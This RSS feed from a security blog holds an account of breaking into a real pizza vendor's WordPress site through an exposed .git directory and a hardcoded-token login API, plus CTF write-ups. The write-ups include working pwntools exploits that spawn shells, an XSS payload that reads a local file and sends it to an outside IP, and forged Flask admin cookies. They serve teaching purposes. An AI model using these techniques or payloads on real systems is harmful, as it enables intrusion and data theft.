<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Empire Total - Securinets Quals20 | Ahmed Belkahla</title>
    <link>https://ahmed-belkahla.me/</link>
      <atom:link href="https://ahmed-belkahla.me/index.xml" rel="self" type="application/rss+xml" />
    <description>Empire Total - Securinets Quals20</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>Â© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sat, 21 Mar 2020 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://ahmed-belkahla.me/img/quals.jpg</url>
      <title>Empire Total - Securinets Quals20</title>
      <link>https://ahmed-belkahla.me/</link>
    </image>
    
    <item>
      <title>How i hacked a famous pizza vendor in Tunisia ?</title>
      <link>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</link>
      <pubDate>Wed, 27 May 2020 09:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/</guid>
      <description>&lt;h1 id=&#34;how-i-hacked-a-famous-pizza-vendor-in-tunisia--&#34;&gt;&lt;strong&gt;How i hacked a famous pizza vendor in Tunisia ?&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Generally i&amp;rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D
It&amp;rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :(
and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook. I decided to take a look on their website and try to
find a way to break it.&lt;/p&gt;
&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;I started browsing the website and doing some basic recon , it was a typical wordpress website without any catching
exploits or some really outdated plugins . I have also ran the famous Wpscan and tried to brute force the admin account but unfortunately i got nothing.&lt;/p&gt;
&lt;p&gt;My next step was trying to explore if there&amp;rsquo;s some insecure code management and Bingo it appeared that the developers forgot the .git directory there, so we can dump the source code of the web app.
I used the famous gitdumper and extractor shell scripts to do that and we were so lucky! i found some juicy informations there ( a database backup for all users and promo codes , wp-config file containing all secret codes and salts used to hash users passwords ..)
This was really some juicy informations but i wanted to explore more , i started reviewing the source code and after a while
i found an awesome api , it checks a hardcoded token and then using only a phone number as input it logins to the phone number owner account :o&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/MqDN2Ai.jpg&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;why-do-they-use-it--&#34;&gt;Why do they use it ?&lt;/h3&gt;
&lt;p&gt;This api was meant to be accessed only from the call service employees and the developer told me that only some white listed ips were allowed to visit it. It was like a secret hidden backdoor .&lt;/p&gt;
&lt;p&gt;However using the hardcoded token we can access any account , you may be asking how i found the phone number of a privileged user , the database didn&amp;rsquo;t have any useful informations for this (it was an old DB) so i had to think for a while and finally
i remembered that i found and old list of orders informations in the uploads directory and usually the first order will be
passed by the developer to test the web app so i searched there for a little bit and Bingo after entering the phone
number w got access to the admin dashboard :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vcFJQX9.jpg&#34; alt=&#34;DASHBOARD&#34;&gt;&lt;/p&gt;
&lt;p&gt;I wanted to stop here but i think it was possible to get a reverse shell by modifying the templating files and
i believe that they are using a shared server (many websites hosted on the same server)
so going so far won&amp;rsquo;t be a good idea .&lt;/p&gt;
&lt;p&gt;I really had fun trying to break the website, the developer was so nice and fixed this out so quickly and for
me i had to skip my morning classes as i completed all this at 4 am and i had to complete my annoying homework tomorrow in the lunch break.&lt;/p&gt;
&lt;p&gt;For those asking i didn&amp;rsquo;t get any bounties for this , i didn&amp;rsquo;t even expect that xd&lt;/p&gt;
&lt;p&gt;Thank you for reading this article, i hope you enjoyed your ride, don&amp;rsquo;t forget to take a look
at my previous articles and follow me on twitter for more exciting content :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Detailed Writeups - Binary Exploitation</title>
      <link>https://ahmed-belkahla.me/post/detailed-pwn-writeups/</link>
      <pubDate>Mon, 20 Apr 2020 20:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/detailed-pwn-writeups/</guid>
      <description>&lt;p&gt;To make sure that i learned something well , i always want to write an article about that topic and it&amp;rsquo;ll be an opportunity to do more researchs about it.
The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys &amp;lt;3 anyway that&amp;rsquo;s why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This article assumes that you have basic knowledge of assembly and C language&lt;/p&gt;
&lt;h2 id=&#34;summary-&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;1- &lt;strong&gt;Jump Not Found&lt;/strong&gt; From UMD CTF : heap based overflow&lt;/p&gt;
&lt;p&gt;2- &lt;strong&gt;Dorsia3&lt;/strong&gt; From WPI CTF: Format string Vulnerability&lt;/p&gt;
&lt;h2 id=&#34;jump-not-found-400pts-25-solves-&#34;&gt;Jump Not Found 400pts (25 solves)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/nerLXcA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
&lt;h3 id=&#34;tldr-&#34;&gt;TL;DR&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Exploit a Heap based overflow to overwrite a function address with the Win function address&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bypass a little problem of the presence of &amp;ldquo;0x0a&amp;rdquo;(&amp;quot;\n&amp;rdquo;) in the Win function address&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;introduction-&#34;&gt;Introduction&lt;/h3&gt;
&lt;p&gt;Before diving into the exploitation part , let&amp;rsquo;s talk about the heap section ,you have probably heard or used &lt;strong&gt;malloc&lt;/strong&gt; or &lt;strong&gt;calloc&lt;/strong&gt; functions in C ,
these functions are used to allocate memory on the heap,it is a region of your computer&amp;rsquo;s memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/aVPbDZM.png&#34; alt=&#34;SECTIONS&#34;&gt;&lt;/p&gt;
&lt;p&gt;The allocation algorithm in an abstract way is quite simple , we won&amp;rsquo;t dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it&amp;rsquo;s reserved in the heap and malloc returns the address of the beginning of the chunk where we can store the data we want.&lt;/p&gt;
&lt;p&gt;You may be asking how your computer knows where the next free chunk starts ? That&amp;rsquo;s quite simple, before each allocated chunk its size is allocated just before it, so the address of the next free chunk will be :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Address of the beginning of chunk1 + Its size&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7ewvjK7.png&#34; alt=&#34;Allocation&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Let the fun begin now :D after downloading the binary let&amp;rsquo;s do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Ra3YFyG.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;p&gt;Observing the main function , we can notice that it&amp;rsquo;s allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;  local_20 = (char *)malloc(0x42);
  local_18 = (code **)malloc(0x18);
  *local_18 = jumpToHoth;
  local_18[1] = jumpToCoruscant;
  local_18[2] = jumpToEndor;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Of course as the most vigilant readers noticed , it&amp;rsquo;s using the dangerous function &lt;strong&gt;gets&lt;/strong&gt; so we have the possibility to overflow stuffs :D Now here is our plan:&lt;/p&gt;
&lt;p&gt;We will abuse the gets function and overwrite the jumpToHoth address with &lt;strong&gt;jumpToNaboo&lt;/strong&gt; function which will prints the flag for us
Before that we need to figure out the offset so let&amp;rsquo;s open the binary in gdb, set a breakpoint after gets and enter a simple pattern&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Xpc9YFp.png&#34; alt=&#34;GDB&#34;&gt;&lt;/p&gt;
&lt;p&gt;After that let&amp;rsquo;s visualize the interesting part of the heap&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/qb2XMHG.png&#34; alt=&#34;HEAP&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see the &amp;ldquo;AAAAAAAABBBBBBBB&amp;rdquo; that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let&amp;rsquo;s begin writing our exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from pwn import *
p=process(&amp;quot;./JNF&amp;quot;)
#p=remote(&amp;quot;192.241.138.174&amp;quot;,9996)
p.recvuntil(&amp;quot;CONSOLE&amp;gt;&amp;quot;)
WIN=p64(0x000000000040070e)
OFFSET=&amp;quot;1&amp;quot;+&amp;quot;A&amp;quot;*79
payload=OFFSET
payload+=WIN
p.sendline(payload)
log.info(&amp;quot;Found Flag ! &amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The reason why i wrote *&lt;em&gt;OFFSET=&amp;quot;1&amp;quot;+&amp;quot;A&amp;rdquo;&lt;em&gt;79&lt;/em&gt;&lt;/em&gt; is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;        gets(local_20);
        lVar2 = strtol(local_20,&amp;amp;local_28,10);
        *(short *)(local_20 + 0x40) = (short)lVar2;
        sVar1 = *(short *)(local_20 + 0x40);
        if (sVar1 != 2) break;
        puts(&amp;quot;Checking navigation...&amp;quot;);
        (*local_18[1])();
      }
      if (2 &amp;lt; sVar1) break;
      if (sVar1 == 1) { .....
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Why 0x000000000040070e not the real address 0x000000000040070a&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/LcvZ0yt.png&#34; alt=&#34;FUNC&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we know gets function stops when it encounters &amp;ldquo;\n&amp;rdquo; (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :(
Fortunately observing the assembly code of &lt;strong&gt;jumpToNaboo&lt;/strong&gt; function we will see that we can start from the address that holds the part we want , which is printing the flag :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/YEv55cw.png&#34; alt=&#34;ASSEMBLY&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Finally running the exploit will bring the flag for us :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Hzqpy0X.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
&lt;p&gt;That was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let&amp;rsquo;s pass now to the second task which is a format string vulnerability.&lt;/p&gt;
&lt;h2 id=&#34;dorsia3-250pts-55-solves-&#34;&gt;Dorsia3 250pts (55 solves)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/CkCR80H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can Download the binary 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/nanoprint&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt; and the libc 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia3/libc.so.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;, give it a try alone before reading the writeup that&amp;rsquo;s the best way to LEARN .&lt;/p&gt;
&lt;h3 id=&#34;tldr--1&#34;&gt;TL;DR&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;introduction--1&#34;&gt;Introduction&lt;/h3&gt;
&lt;p&gt;As a quick introduction this is a brief explanation of the format string vulnerability :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack.
&lt;em&gt;&lt;strong&gt;Wikipedia&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A quick Example :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/1ImQ6zG.png&#34; alt=&#34;FMT&#34;&gt;&lt;/p&gt;
&lt;p&gt;If things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D&lt;/p&gt;
&lt;h3 id=&#34;exploitation--1&#34;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;In this task we are given the source code of the task , the binary and the libc .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/26HRSAR.png&#34; alt=&#34;CODE&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/by2UA23.png&#34; alt=&#34;BINARY&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s do some static analysis , running the file and checksec commands , we get these results:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/krietXO.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So we have a 32 bit binary with PIE and NX protections enabled , so we won&amp;rsquo;t be able to overwrite the GOT entry of a function since its address is randomized .&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Let&amp;rsquo;s Get our hands dirty&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Firstly , let&amp;rsquo;s create a pad function to make sure that the offset won&amp;rsquo;t change and let&amp;rsquo;s find the offset of our format string to know exactly where our buffer starts.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
p=process(&amp;quot;./nanoprint&amp;quot;)
p.recvline()
p.sendline(pad(&amp;quot;BAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|&amp;quot;))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/065Lo1y.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So our offset will be 7 , now let&amp;rsquo;s talk about our scenario , we will overwrite the saved eip with a one gadget from the libc ==&amp;gt; Spawn a shell \o/&lt;/p&gt;
&lt;p&gt;We have all we need , an address from the stack and the system function address from libc, so let&amp;rsquo;s write our exploit and retrieve these address properly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
p=process(&amp;quot;./nanoprint&amp;quot;)
#p=remote(&amp;quot;dorsia3.wpictf.xyz&amp;quot;,31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info(&amp;quot;Buffer starts: &amp;quot;+hex(BUFFER))
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
pause()
p.sendline(pad(&amp;quot;JUNK&amp;quot;))
p.interactive()


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since we have the libc binary let&amp;rsquo;s calculate the libc base , and using gdb lets run the first part of our exploit and try to figure the offset between our buffer and the saved eip :&lt;/p&gt;
&lt;p&gt;1- Run our little exploit&lt;/p&gt;
&lt;p&gt;2- run gdb with the following command:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gdb -p `pidof nanoprint`&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/3sALPs3.png&#34; alt=&#34;GDB&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/1KGRjzU.png&#34; alt=&#34;OUT&#34;&gt;&lt;/p&gt;
&lt;p&gt;So the offset is 0x71 ,finally  let&amp;rsquo;s choose the one gadget , i have used the famous 
&lt;a href=&#34;https://github.com/david942j/one_gadget&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;one_gadget&lt;/a&gt; tool&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Ly6WJjh.png&#34; alt=&#34;LIBC&#34;&gt;&lt;/p&gt;
&lt;p&gt;After some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x3d0e0 execve(&amp;quot;/bin/sh&amp;rdquo;, esp+0x40, environ)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;constraints:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;esi is the GOT address of libc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[esp+0x40] == NULL&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;now we have everything we need let&amp;rsquo;s finish our exploit :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def pad(str):
        return str+(60-len(str))*&amp;quot;B&amp;quot;
#p=process(&amp;quot;./nanoprint&amp;quot;)
p=remote(&amp;quot;dorsia3.wpictf.xyz&amp;quot;,31337)
data=p.recvline()
BUFFER=int(data[:10],16)
SYSTEM=int(data[-11:-1],16)+288
log.info(&amp;quot;Buffer starts: &amp;quot;+hex(BUFFER))
log.info(&amp;quot;System address: &amp;quot;+hex(SYSTEM))
BASE=SYSTEM-0x3d200
one_gadget=BASE+0x3d0e0
RET=BUFFER+0x71
RET2=RET+2
log.info(&amp;quot;Writing to: &amp;quot;+hex(RET))
payload=&amp;quot;B&amp;quot;
payload+=p32(RET)
payload+=p32(RET2)
off1=(one_gadget &amp;amp; 0xffff)-9 #First 2 bytes
off2=int(hex(one_gadget &amp;amp; 0xffff0000)[:-4],16)-(one_gadget &amp;amp; 0xffff)  
log.info(&amp;quot;one gadget address: &amp;quot;+hex(one_gadget))
log.info(&amp;quot;offset1 and 2: &amp;quot;+str(off1)+&amp;quot;|&amp;quot;+str(off2))
payload+=&amp;quot;%&amp;quot;+str(off1)+&amp;quot;x&amp;quot;
payload+=&amp;quot;%7$hn&amp;quot;
payload+=&amp;quot;%&amp;quot;+str(off2)+&amp;quot;x&amp;quot;
payload+=&amp;quot;%8$hn&amp;quot;
#pause()
p.sendline(pad(payload))
p.interactive()

#Offset buffer-ret : +0x71
#offset fmt 7

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running our exploit will spawn the shell for us \o/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/MWLKHRX.png&#34; alt=&#34;SHELL&#34;&gt;&lt;/p&gt;
&lt;p&gt;Thank you for reading the whole writeup :D I hope you liked it , you can check my github repo where i share my 
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CTF writeups&lt;/a&gt; ! Arigatoo \o/&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>HackZone VIII - Web Writeups</title>
      <link>https://ahmed-belkahla.me/post/hackzone-viii/</link>
      <pubDate>Sun, 12 Apr 2020 00:10:44 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/hackzone-viii/</guid>
      <description>&lt;p&gt;Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/xrafZEo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;babyweb1722pts10-solves-&#34;&gt;&lt;strong&gt;BabyWeb1(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/zu1XKQe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/9hXA90t.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Trying to post a picture with the same title of the posted pictures will be denied so let&amp;rsquo;s try SQL truncation attack and submit a picture with these details :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Title : &amp;ldquo;naaah                                                                 &amp;quot;&lt;/li&gt;
&lt;li&gt;url : &amp;ldquo;anything here&amp;rdquo;
-msg : &amp;ldquo;anything&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And Bingo it passed the title check and we got a password :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/rywyGg4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using this password will give us the details of the picture and the flag if we check the source code :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bpK7N8F.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;insecure884pts4-solves-&#34;&gt;&lt;strong&gt;Insecure(884pts)(4 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ehpXH1T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/lISjgSe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Accessing this url will give us the first part (The same bucket where Hackzone Logo is stored)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://storage.googleapis.com/hzviii/flag_part1.txt&#34;&gt;https://storage.googleapis.com/hzviii/flag_part1.txt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1st Part:&lt;/strong&gt; HZVIII{Buck3t_M1sc0nf1gur4t1on_&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files .
It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd&lt;/p&gt;
&lt;p&gt;After some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it&amp;rsquo;s using phantom Js to convert this text .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/UAn5UOk.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our scenario now is revealed , we&amp;rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered .
I passed a lot of time in this part and tried a lot with basically this payload but i didn&amp;rsquo;t get anything :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;aa&amp;quot; onerror=&amp;quot;function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener(&#39;load&#39;, reqListener); 
oReq.open(&#39;GET&#39;, &#39;file:///psycor/flag_part2.txt&#39;); 
oReq.send();&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I have than tried to read it using iframes but i didn&amp;rsquo;t have any results :&#39;(&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bZInnkb.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This was really painful xd i thinked that maybe using onerror attribute , phantom Js won&amp;rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it&amp;rsquo;s filtered so all we have to do is bypass this filter :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ySPcXuS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we see in the picture below , the script word is stripped so what if we enter :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;scscriptript&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The script word will be stripped and Bingo we will have our script tag , let&amp;rsquo;s try it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/OqHP5I5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;scscriptript src=&amp;quot;http://100.26.206.184:1234/test.js&amp;quot;&amp;gt;&amp;lt;/scscriptript&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE :&lt;/strong&gt; It&amp;rsquo;s my VPS IP so DONT use it :D&lt;/p&gt;
&lt;p&gt;And i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener(&amp;quot;load&amp;quot;, reqListener); 
oReq.open(&amp;quot;GET&amp;quot;, &amp;quot;file:///psycor/flag_part2.txt&amp;quot;); 
oReq.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And yees we received an answer :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hTbrKXX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Base64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts&lt;/p&gt;
&lt;h1 id=&#34;calculator722pts10-solves-&#34;&gt;&lt;strong&gt;Calculator(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/iLqircE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We will now leak the Secret key of the app and sign a session cookie that has the attribute &amp;ldquo;is_admin&amp;rdquo; set to True .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jTwwuLm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;To do that we will use flask-unsign tool with the following command :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flask-unsign &amp;ndash;sign &amp;ndash;cookie &amp;ldquo;{&amp;lsquo;is_admin&amp;rsquo;: True}&amp;rdquo; &amp;ndash;secret &amp;lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8&amp;rsquo; &amp;ndash;legacy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/NIEbykl.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And changing the cookie will give us the flag !&lt;/p&gt;
